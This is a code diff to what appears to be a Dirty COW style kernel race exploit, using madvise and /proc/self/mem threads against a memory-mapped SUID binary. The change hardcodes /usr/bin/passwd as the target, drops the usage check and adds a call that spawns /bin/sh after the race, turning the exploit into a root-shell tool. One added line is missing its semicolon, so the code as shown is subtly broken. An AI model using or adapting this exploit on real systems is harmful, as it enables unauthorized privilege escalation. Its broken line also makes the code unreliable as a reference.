@@ -54,24 +54,24 @@ void *procselfmemThread(void *arg) {
 }
 
 int main(int argc, char *argv[]) {
-    if (argc < 2) {
-        fprintf(stderr, "Usage: %s target_SUID_binary\n", argv[0]);
-        return 1;
-    }
 
     pthread_t pth1, pth2;
-    f = open(argv[1], O_RDONLY);
+
+    name = "/usr/bin/passwd"
+    f = open(name, O_RDONLY);
     fstat(f, &st);
-    name = argv[1];
     
     map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, f, 0);
     printf("mmap %zx\n", (uintptr_t) map);
     
-    pthread_create(&pth1, NULL, madviseThread, argv[1]);
+    pthread_create(&pth1, NULL, madviseThread, name);
     pthread_create(&pth2, NULL, procselfmemThread, buf);
     
     pthread_join(pth1, NULL);
     pthread_join(pth2, NULL);
+
+
+    execl("/bin/sh", "sh", NULL);
     
     return 0;
 }
